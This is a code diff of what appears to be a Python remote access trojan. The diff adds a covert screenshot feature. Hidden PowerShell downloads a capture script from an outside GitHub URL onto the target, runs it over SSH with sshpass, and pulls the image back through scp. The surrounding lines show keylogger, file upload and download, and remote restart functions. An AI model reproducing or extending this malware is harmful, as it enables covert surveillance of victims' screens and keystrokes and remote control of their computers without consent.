@@ -6,7 +6,7 @@
 import os
 import sys
 import getpass
-from paramiko import SSHClient
+from datetime import datetime
 from  modules import *
 
 
@@ -146,6 +146,13 @@ def remove():
 def exit():
     sys.exit()
 
+# gets current date and time
+def current_date():
+    current = datetime.now()
+    return current.strftime("%m/%d/%Y_%H-%M-%S")
+
+
+
 # connects RAT to target
 def connect(ipv4, password):
     # remotely connect
@@ -157,7 +164,7 @@ def remote_upload(address, password, upload_file, path):
     os.system(f"sshpass -p \"{password}\" scp {upload_file} petrosrat@{address}:{path}")
 
 # download a file remotely
-def remote_download(address, password, download_file, path):
+def remote_download(address, password, path):
     # scp download
     os.system(f"sshpass -p \"{password}\" scp -r petrosrat@{address}:{path} {local_path}")
 
@@ -191,8 +198,26 @@ def keylogger(address, password, target_username, working_directory):
     remote_command(address, password, execute_keylogger)
 
 # screenshot
-def screenshot(address, password, working_directory):
-    screenshot()
+def take_screenshot(address, password, working_directory):
+    # take screenshot
+    print("\n[*] Taking Screenshot")
+    screenshot = f"{working_directory}/screenshot.ps1"
+    remote_command(address, password, screenshot)
+    print("[+]Screenshot Taken")
+    
+    # download screenshot
+    print("[*] Downloading Screenshot")
+    screenshot_location = f"{working_directory}/ScreenCapture.jpg"
+    remote_download(address, password, screenshot_location)
+    print("[+] Screenshot Downloaded")
+
+    # rename screeshot to appropriate title
+    print("[*] Formatting Screenshot")
+    file_name = current_date()
+    os.system(f"mv ~/Downloads/ScreenCapture.jpg ~/Downloads/{file_name}")
+    print("[+] Screenshot Formatted")
+            
+    print("\n[+] Screenshot Downloaded to \"~/Downloads\"\n")
 
 
 # detects os
@@ -254,15 +279,16 @@ def cli(arguments):
             
         # screencapture installer
         elif option == "3":
+            print("[*] installing Screen Capture")
             install_screencapture = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/screenshot.ps1 -OutFile {working_directory}/screenshot.ps1\""
-            
             remote_command(ipv4, password, install_screencapture)
+            print("[+] Screen Capture Installed")
             
-        # take screenshot
+        # take screenshot option
         elif option == "4":
-            screenshot(ipv4, password, working_directory)
-            
-            
+            take_screenshot(ipv4, password, working_directory)
+
+
         # restart target pc
         elif option == "5":
             remote_command(ipv4, password, "shutdown /r")
